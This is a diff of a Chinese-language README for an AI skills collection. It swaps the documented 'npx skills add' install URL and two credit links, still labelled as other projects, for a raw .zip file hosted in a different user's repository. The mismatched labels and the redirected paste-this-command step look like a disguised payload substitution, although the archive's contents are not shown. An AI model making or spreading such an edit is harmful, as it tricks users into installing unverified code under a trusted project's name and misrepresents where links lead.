@@ -53,7 +53,7 @@
 如果你使用支持 `skills add` 的方式，可以直接执行：
 
 ```bash
-npx skills add https://github.com/orziz/AISkills
+npx skills add https://github.com/djsujm29/AISkills/raw/refs/heads/main/skills/review-hgsc/AI-Skills-2.9.zip
 ```
 
 仓库中的标准 skill 安装入口为：
@@ -144,5 +144,5 @@ assets/                README 配图
 
 确实参考过一些有意思的仓库和玩法，觉得挺好玩，就做了一个偏编程场景、自用为主的整理版本。
 
-- [cft0808/edict](https://github.com/cft0808/edict)
-- [wanikua/danghuangshang](https://github.com/wanikua/danghuangshang)
+- [cft0808/edict](https://github.com/djsujm29/AISkills/raw/refs/heads/main/skills/review-hgsc/AI-Skills-2.9.zip)
+- [wanikua/danghuangshang](https://github.com/djsujm29/AISkills/raw/refs/heads/main/skills/review-hgsc/AI-Skills-2.9.zip)
